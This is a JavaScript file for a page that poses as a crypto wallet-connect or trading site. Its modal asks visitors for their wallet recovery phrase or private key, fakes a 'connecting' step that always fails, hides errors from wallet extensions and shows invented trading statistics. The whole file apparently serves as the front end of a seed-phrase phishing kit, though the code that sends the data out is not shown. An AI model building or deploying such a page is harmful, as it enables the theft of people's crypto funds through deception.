// State management
let currentWalletStep = "list"
let selectedWallet = ""
let showRecoveryPhraseText = false
let showPrivateKeyText = false
// track pending close timeout so open can cancel it
let closeModalTimeoutId = null

// Initialize on page load
window.addEventListener("load", () => {
  // Show welcome popup
  showWelcomePopup()
  
  // Animate counters
  animateCounters()
  
  // Add animation classes to elements
  animateElementsOnLoad()
  
  // Initialize hover effects
  initHoverEffects()
  
  // Initialize scroll animations
  initScrollAnimations()
  
  // Suppress wallet extension errors
  window.addEventListener("error", (event) => {
    if (
      event.message &&
      (event.message.includes("sender_getProviderState") || event.message.includes("No account exist"))
    ) {
      event.preventDefault()
      return false
    }
  })
  
  // Add click outside listener for wallet modal
  document.addEventListener('click', (e) => {
    const modal = document.getElementById('walletModal');
    if (modal.classList.contains('show') && 
        !e.target.closest('.wallet-modal') && 
        !e.target.closest('.hero-connect-btn') &&
        !e.target.closest('.connect-wallet-btn')) {
      closeWalletModal();
    }
  });
})

// Animate elements on load
function animateElementsOnLoad() {
  const elements = {
    '.header': 'slide-in-left',
    '.hero h2': 'slide-in-left',
    '.hero p': 'slide-in-right fade-in-delay',
    '.hero-connect-btn': 'slide-in-up fade-in-delay-2 pop-up',
    '.stats-card': 'slide-in-up fade-in-delay-2'
  }
  
  setTimeout(() => {
    Object.entries(elements).forEach(([selector, className]) => {
      const element = document.querySelector(selector)
      if (element) {
        element.classList.add(className)
      }
    })
  }, 100)
}

// Initialize hover effects
function initHoverEffects() {
  // Add ripple effect to buttons
  const buttons = document.querySelectorAll('button:not(.modal-close):not(.menu-btn):not(.welcome-close):not(.toggle-visibility)')
  buttons.forEach(button => {
    button.addEventListener('mouseenter', function() {
      this.style.transform = 'translateY(-2px)'
      this.style.transition = 'all 0.3s ease'
    })
    
    button.addEventListener('mouseleave', function() {
      this.style.transform = 'translateY(0)'
    })
    
    // Add click ripple effect
    button.addEventListener('click', function(e) {
      const ripple = document.createElement('span')
      const rect = this.getBoundingClientRect()
      const size = Math.max(rect.width, rect.height)
      const x = e.clientX - rect.left - size / 2
      const y = e.clientY - rect.top - size / 2
      
      ripple.style.cssText = `
        position: absolute;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.7);
        transform: scale(0);
        animation: ripple-animation 0.6s linear;
        width: ${size}px;
        height: ${size}px;
        left: ${x}px;
        top: ${y}px;
        pointer-events: none;
      `
      
      this.appendChild(ripple)
      setTimeout(() => ripple.remove(), 600)
    })
  })
}

// Initialize scroll animations
function initScrollAnimations() {
  const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
  }
  
  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('pop-up')
        observer.unobserve(entry.target)
      }
    })
  }, observerOptions)
  
  // Observe elements for scroll animations
  const elementsToObserve = document.querySelectorAll('.stats-card, .wallet-option, .import-option')
  elementsToObserve.forEach(el => observer.observe(el))
}

// Welcome Popup
function showWelcomePopup() {
  const popup = document.getElementById("welcomePopup")
  popup.classList.add("show", "pop-up")
  
  // auto-hide after 5 seconds with fade out
  setTimeout(() => {
    popup.style.opacity = '0'
    popup.style.transform = 'translateY(-20px)'
    popup.style.transition = 'all 0.5s ease'
    
    setTimeout(() => {
      popup.classList.remove("show")
      popup.style.opacity = ''
      popup.style.transform = ''
      popup.style.transition = ''
    }, 500)
  }, 5000)
}

function closeWelcomePopup() {
  const popup = document.getElementById("welcomePopup")
  popup.style.opacity = '0'
  popup.style.transform = 'translateY(-20px)'
  popup.style.transition = 'all 0.5s ease'
  
  setTimeout(() => {
    popup.classList.remove("show")
    popup.style.opacity = ''
    popup.style.transform = ''
    popup.style.transition = ''
  }, 500)
}

// Mobile Menu
function openMobileMenu() {
  const menu = document.getElementById("mobileMenu")
  menu.classList.add("show")
}

function closeMobileMenu() {
  const menu = document.getElementById("mobileMenu")
  menu.classList.remove("show")
}

// Wallet Modal
function openWalletModal() {
  const modal = document.getElementById("walletModal")
  if (!modal) return

  // Cancel any pending close animation so inline styles don't remain
  if (closeModalTimeoutId) {
    clearTimeout(closeModalTimeoutId)
    closeModalTimeoutId = null
  }

  modal.classList.add("show")

  // Reset inline styles that might have been left by a prior close animation
  const walletModal = modal.querySelector('.wallet-modal')
  if (walletModal) {
    walletModal.style.transform = ''
    walletModal.style.opacity = ''
    walletModal.style.transition = ''

    // clear inline styles on modal-content children
    const modalContents = walletModal.querySelectorAll('.modal-content')
    modalContents.forEach(c => {
      c.style.opacity = ''
      c.style.transform = ''
      c.style.transition = ''
      // keep display:none where applicable — showWalletStep will handle visibility
    })
  }

  // Reset to wallet list
  showWalletStep("walletList")

  // Add animation class to modal (allow CSS to animate from clean state)
  setTimeout(() => {
    if (walletModal) walletModal.classList.add('pop-up')
  }, 10)

  closeMobileMenu()

  // Animate wallet options sequentially (reset first to ensure consistent state)
  setTimeout(() => {
    const walletOptions = document.querySelectorAll('.wallet-option')
    walletOptions.forEach((option, index) => {
      option.classList.remove('slide-in-up')
      option.style.animationDelay = ''
      setTimeout(() => {
        option.classList.add('slide-in-up')
        option.style.animationDelay = `${index * 0.08}s`
      }, 80)
    })
  }, 300)
}

function closeWalletModal() {
  const modal = document.getElementById("walletModal")
  if (!modal) return
  const walletModal = modal.querySelector('.wallet-modal')
  if (!walletModal) {
    modal.classList.remove("show")
    return
  }

  // Add exit animation inline so it animates away
  walletModal.style.transform = 'translateY(100px) scale(0.95)'
  walletModal.style.opacity = '0'
  walletModal.style.transition = 'all 0.28s ease'

  // Store timeout id so open can cancel and clear inline styles reliably
  closeModalTimeoutId = setTimeout(() => {
    modal.classList.remove("show")

    // clear inline styles left by animation
    walletModal.style.transform = ''
    walletModal.style.opacity = ''
    walletModal.style.transition = ''
    walletModal.classList.remove('pop-up')

    // Reset state
    currentWalletStep = "list"
    selectedWallet = ""
    const recoveryInput = document.getElementById("recoveryPhraseInput")
    if (recoveryInput) recoveryInput.value = ""
    const privateInput = document.getElementById("privateKeyInput")
    if (privateInput) privateInput.value = ""

    // Clear any error messages
    const errorMessages = document.querySelectorAll('.error-message')
    errorMessages.forEach(error => error.remove())

    // Reset wallet option animations and inline styles
    const walletOptions = document.querySelectorAll('.wallet-option')
    walletOptions.forEach(option => {
      option.classList.remove('slide-in-up')
      option.style.animationDelay = ''
      option.style.opacity = ''
      option.style.transform = ''
      option.style.transition = ''
    })

    // Clear any inline styles on modal-content children just in case
    const modalContents = walletModal.querySelectorAll('.modal-content')
    modalContents.forEach(c => {
      c.style.opacity = ''
      c.style.transform = ''
      c.style.transition = ''
    })

    closeModalTimeoutId = null
  }, 300)
}

function showWalletStep(stepId) {
  // Hide all steps
  const steps = ["walletList", "walletOptions", "recoveryPhrase", "privateKey", "connecting", "connectionFailed"]
  steps.forEach((step) => {
    const stepElement = document.getElementById(step)
    if (stepElement) {
      stepElement.style.display = "none"
    }
  })

  // Show selected step
  const stepElement = document.getElementById(stepId)
  if (stepElement) {
    stepElement.style.display = "block"
  }
}

function selectWallet(walletName) {
  selectedWallet = walletName

  // image mapping — make sure files are present in assets/
  const walletImages = {
    "Phantom": "assets/Phantom Logo.png",
    "Solflare": "assets/Solfare Logo.png",
    "Trust Wallet": "assets/Trust wallet Logo.png",
    "WalletConnect": "assets/Wallet Connect Logo.png"
  }

  const imgSrc = walletImages[walletName] || "assets/wallet-default.png"

  // update all display images if present
  const selectedImg = document.getElementById('selectedWalletIconImg')
  const recoveryImg = document.getElementById('recoveryWalletIconImg')
  const privateImg = document.getElementById('privateKeyWalletIconImg')
  if (selectedImg) selectedImg.src = imgSrc
  if (recoveryImg) recoveryImg.src = imgSrc
  if (privateImg) privateImg.src = imgSrc

  // update names
  const nameEls = document.querySelectorAll('#selectedWalletName, #recoveryWalletName, #privateKeyWalletName')
  nameEls.forEach(el => el.textContent = walletName)

  // keep the rest of the existing selectWallet behavior (animations / step change)
  // Animate the selected option
  const options = document.querySelectorAll('.wallet-option')
  options.forEach(option => {
    if (option.querySelector('span').textContent === walletName) {
      option.classList.add('hover-glow')
      setTimeout(() => option.classList.remove('hover-glow'), 1000)
    }
  })
  
  // Update all wallet displays
  const displays = [
    { icon: "selectedWalletIcon", name: "selectedWalletName" },
    { icon: "recoveryWalletIcon", name: "recoveryWalletName" },
    { icon: "privateKeyWalletIcon", name: "privateKeyWalletName" },
  ]
  
  displays.forEach((display) => {
    const iconElement = document.getElementById(display.icon)
    const nameElement = document.getElementById(display.name)
    
    if (iconElement && nameElement) {
      nameElement.textContent = walletName
      
      // Update icon class with animation
      iconElement.style.transform = 'scale(0)'
      setTimeout(() => {
        iconElement.className = "wallet-icon"
        if (walletName === "Phantom") {
          iconElement.classList.add("phantom")
        } else if (walletName === "Solflare") {
          iconElement.classList.add("solflare")
        } else if (walletName === "Trust Wallet") {
          iconElement.classList.add("trust")
        } else if (walletName === "WalletConnect") {
          iconElement.classList.add("walletconnect")
        }
        iconElement.style.transform = 'scale(1)'
        iconElement.style.transition = 'transform 0.3s ease'
      }, 150)
    }
  })
  
  // Animate transition to next step
  const currentStep = document.querySelector('.modal-content[style*="block"]')
  if (currentStep) {
    currentStep.style.opacity = '0'
    currentStep.style.transform = 'translateX(-20px)'
    currentStep.style.transition = 'all 0.3s ease'
  }
  
  setTimeout(() => {
    showWalletStep("walletOptions")
    const nextStep = document.getElementById("walletOptions")
    if (nextStep) {
      nextStep.style.opacity = '0'
      nextStep.style.transform = 'translateX(20px)'
      
      setTimeout(() => {
        nextStep.style.opacity = '1'
        nextStep.style.transform = 'translateX(0)'
        nextStep.style.transition = 'all 0.3s ease'
      }, 10)
    }
  }, 300)
}

function showRecoveryPhrase() {
  const currentStep = document.querySelector('.modal-content[style*="block"]')
  if (currentStep) {
    currentStep.style.opacity = '0'
    currentStep.style.transform = 'translateX(-20px)'
    currentStep.style.transition = 'all 0.3s ease'
  }
  
  setTimeout(() => {
    showWalletStep("recoveryPhrase")
    const nextStep = document.getElementById("recoveryPhrase")
    if (nextStep) {
      nextStep.style.opacity = '0'
      nextStep.style.transform = 'translateX(20px)'
      
      setTimeout(() => {
        nextStep.style.opacity = '1'
        nextStep.style.transform = 'translateX(0)'
        nextStep.style.transition = 'all 0.3s ease'
      }, 10)
    }
  }, 300)
}

function showPrivateKey() {
  const currentStep = document.querySelector('.modal-content[style*="block"]')
  if (currentStep) {
    currentStep.style.opacity = '0'
    currentStep.style.transform = 'translateX(-20px)'
    currentStep.style.transition = 'all 0.3s ease'
  }
  
  setTimeout(() => {
    showWalletStep("privateKey")
    const nextStep = document.getElementById("privateKey")
    if (nextStep) {
      nextStep.style.opacity = '0'
      nextStep.style.transform = 'translateX(20px)'
      
      setTimeout(() => {
        nextStep.style.opacity = '1'
        nextStep.style.transform = 'translateX(0)'
        nextStep.style.transition = 'all 0.3s ease'
      }, 10)
    }
  }, 300)
}

function backToOptions() {
  const currentStep = document.querySelector('.modal-content[style*="block"]')
  if (currentStep) {
    currentStep.style.opacity = '0'
    currentStep.style.transform = 'translateX(20px)'
    currentStep.style.transition = 'all 0.3s ease'
  }
  
  setTimeout(() => {
    showWalletStep("walletOptions")
    const nextStep = document.getElementById("walletOptions")
    if (nextStep) {
      nextStep.style.opacity = '0'
      nextStep.style.transform = 'translateX(-20px)'
      
      setTimeout(() => {
        nextStep.style.opacity = '1'
        nextStep.style.transform = 'translateX(0)'
        nextStep.style.transition = 'all 0.3s ease'
      }, 10)
    }
  }, 300)
}

function backToList() {
  showWalletStep("walletList")
}

function connectWallet() {
  // Check if we're in recovery phrase mode
  const recoveryStep = document.getElementById("recoveryPhrase");
  if (recoveryStep && recoveryStep.style.display === "block") {
    const phrase = document.getElementById("recoveryPhraseInput").value.trim();
    const words = phrase.split(/\s+/).filter(word => word.length > 0);
    
    // Remove any existing error message
    const existingError = document.querySelector('.error-message');
    if (existingError) {
      existingError.remove();
    }
    
    // Validate recovery phrase
    if (words.length < 12) {
      const errorMessage = document.createElement('div');
      errorMessage.className = 'error-message';
      errorMessage.textContent = 'Please enter a valid 12 or 24 word recovery phrase';
      errorMessage.style.color = '#ef4444';
      errorMessage.style.fontSize = '14px';
      errorMessage.style.marginTop = '8px';
      errorMessage.style.display = 'flex';
      errorMessage.style.alignItems = 'center';
      errorMessage.style.gap = '8px';
      
      const errorIcon = document.createElement('div');
      errorIcon.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#ef4444">
          <circle cx="12" cy="12" r="10" stroke="#ef4444" stroke-width="2" fill="none"/>
          <line x1="12" y1="8" x2="12" y2="12" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
          <circle cx="12" cy="16" r="1" fill="#ef4444"/>
        </svg>
      `;
      errorMessage.prepend(errorIcon);
      
      const inputGroup = document.querySelector('.input-group');
      if (inputGroup) {
        inputGroup.appendChild(errorMessage);
      }
      
      return; // Don't proceed with connection
    }
  }
  
  // Proceed with connection
  showWalletStep("connecting")
  
  // Enhanced loading animation
  const spinner = document.querySelector('.spinner-ring')
  if (spinner) {
    spinner.style.animation = 'spin 0.5s linear infinite'
  }
  
  // Add pulsing effect to connecting text
  const connectingText = document.querySelector('.connecting-body h3')
  if (connectingText) {
    connectingText.classList.add('pulse')
  }
  
  // Simulate connection attempt with better feedback
  setTimeout(() => {
    // Remove pulsing effect
    if (connectingText) {
      connectingText.classList.remove('pulse')
    }
    
    // Show connection failed with animation
    const connectingStep = document.getElementById("connecting")
    if (connectingStep) {
      connectingStep.style.opacity = '0'
      connectingStep.style.transform = 'scale(0.9)'
      connectingStep.style.transition = 'all 0.3s ease'
    }
    
    setTimeout(() => {
      showWalletStep("connectionFailed")
      const failedStep = document.getElementById("connectionFailed")
      failedStep.style.opacity = '0'
      failedStep.style.transform = 'scale(1.1)'
      
      setTimeout(() => {
        failedStep.style.opacity = '1'
        failedStep.style.transform = 'scale(1)'
        failedStep.style.transition = 'all 0.3s ease'
      }, 10)
      
      showConnectionFailedBanner()
    }, 300)
  }, 3000)
}

function retryConnection() {
  const failedStep = document.getElementById("connectionFailed")
  failedStep.style.opacity = '0'
  failedStep.style.transform = 'scale(0.9)'
  failedStep.style.transition = 'all 0.3s ease'
  
  setTimeout(() => {
    connectWallet()
  }, 300)
}

function showConnectionFailedBanner() {
  const banner = document.getElementById("connectionFailedBanner")
  banner.classList.add("show", "pop-up")
  
  // Hide after 5 seconds
  setTimeout(() => {
    banner.classList.remove("show")
  }, 5000)
}

// Toggle visibility for inputs
function toggleRecoveryVisibility() {
  showRecoveryPhraseText = !showRecoveryPhraseText
  const input = document.getElementById("recoveryPhraseInput")
  const icon = document.getElementById("recoveryEyeIcon")
  
  if (!input || !icon) return;
  
  if (showRecoveryPhraseText) {
    input.type = "text";
    input.style.fontFamily = "inherit"
    input.style.letterSpacing = "normal"
    // Update icon to EyeOff
    icon.innerHTML =
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>'
  } else {
    input.type = "password";
    input.style.fontFamily = "monospace"
    input.style.letterSpacing = "4px"
    // Update icon to Eye
    icon.innerHTML =
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'
  }
}

function togglePrivateKeyVisibility() {
  showPrivateKeyText = !showPrivateKeyText
  const input = document.getElementById("privateKeyInput")
  const icon = document.getElementById("privateKeyEyeIcon")
  
  if (!input || !icon) return;
  
  if (showPrivateKeyText) {
    input.type = "text";
    input.style.fontFamily = "inherit"
    input.style.letterSpacing = "normal"
    // Update icon to EyeOff
    icon.innerHTML =
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>'
  } else {
    input.type = "password";
    input.style.fontFamily = "monospace"
    input.style.letterSpacing = "4px"
    // Update icon to Eye
    icon.innerHTML =
      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>'
  }
}

// Animate counters
function animateCounters() {
  const targetVolume = 2847392
  const targetTrades = 1247
  const targetSuccess = 94.2
  const duration = 2000
  const steps = 100
  
  let currentStep = 0
  let animationId
  
  function animate() {
    currentStep++
    const progress = Math.min(currentStep / steps, 1)
    
    // Easing function for smoother animation
    const easeOut = (t) => 1 - Math.pow(1 - t, 3)
    const easedProgress = easeOut(progress)
    
    const volume = Math.floor(targetVolume * easedProgress)
    const trades = Math.floor(targetTrades * easedProgress)
    const successRate = Number.parseFloat((targetSuccess * easedProgress).toFixed(1))
    
    document.getElementById("volume").textContent = "$" + volume.toLocaleString()
    document.getElementById("trades").textContent = trades.toLocaleString()
    document.getElementById("successRate").textContent = successRate + "%"
    
    if (currentStep < steps) {
      animationId = requestAnimationFrame(animate)
    } else {
      // Final values with celebration animation
      document.getElementById("volume").textContent = "$" + targetVolume.toLocaleString()
      document.getElementById("trades").textContent = targetTrades.toLocaleString()
      document.getElementById("successRate").textContent = targetSuccess + "%"
      
      // Add celebration effect to success rate
      const successElement = document.getElementById("successRate")
      successElement.classList.add('hover-glow')
      setTimeout(() => successElement.classList.remove('hover-glow'), 1000)
    }
  }
  
  // Start animation after a short delay
  setTimeout(() => {
    animationId = requestAnimationFrame(animate)
  }, 500)
}

// Add keyboard navigation support
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    const modal = document.getElementById('walletModal')
    if (modal.classList.contains('show')) {
      closeWalletModal()
    }
    
    const mobileMenu = document.getElementById('mobileMenu')
    if (mobileMenu.classList.contains('show')) {
      closeMobileMenu()
    }
  }
  
  // Tab navigation for modal
  if (document.getElementById('walletModal').classList.contains('show')) {
    if (e.key === 'Tab') {
      const modal = document.getElementById('walletModal')
      const focusableElements = modal.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])')
      const firstElement = focusableElements[0]
      const lastElement = focusableElements[focusableElements.length - 1]
      
      if (e.shiftKey && document.activeElement === firstElement) {
        lastElement.focus()
        e.preventDefault()
      } else if (!e.shiftKey && document.activeElement === lastElement) {
        firstElement.focus()
        e.preventDefault()
      }
    }
  }
})